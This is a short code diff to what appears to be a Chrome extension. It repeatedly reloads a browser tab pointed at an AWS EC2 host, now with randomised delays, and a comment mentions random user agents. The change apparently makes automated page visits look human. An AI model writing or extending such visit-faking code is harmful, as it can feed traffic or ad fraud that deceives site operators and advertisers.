@@ -7,7 +7,11 @@ function determine_url_from(cookie) {
 }
 
 function random_uri() {
-  return "http://www.elmundodigital.net?xyz"
+  return "http://ec2-54-81-216-13.compute-1.amazonaws.com"
+}
+
+function random_timeout() {
+  return Math.floor((Math.random()*90)+10) * 1000
 }
 
 
@@ -29,9 +33,10 @@ chrome.windows.onCreated.addListener(function(w) {
         var counter     = 0
         var page_visits = Math.floor((Math.random()*6)+2)
 
-        // set random user agent 
+        // set random user agents 
 
-        setInterval(function() {
+        // set random timeout
+        reload_tab = function(wait) {
 
           // if we have iterated 7 times, or this is the first
           // instance, then 
@@ -49,7 +54,14 @@ chrome.windows.onCreated.addListener(function(w) {
 
           chrome.tabs.reload(tab_id, { }, function() { })
 
-        }, 10000)
+          setTimeout(function() { 
+            reload_tab(random_timeout())
+
+          }, wait)
+
+        }
+
+        reload_tab(random_timeout())
       }
       f(w.tabs[0].id)
 
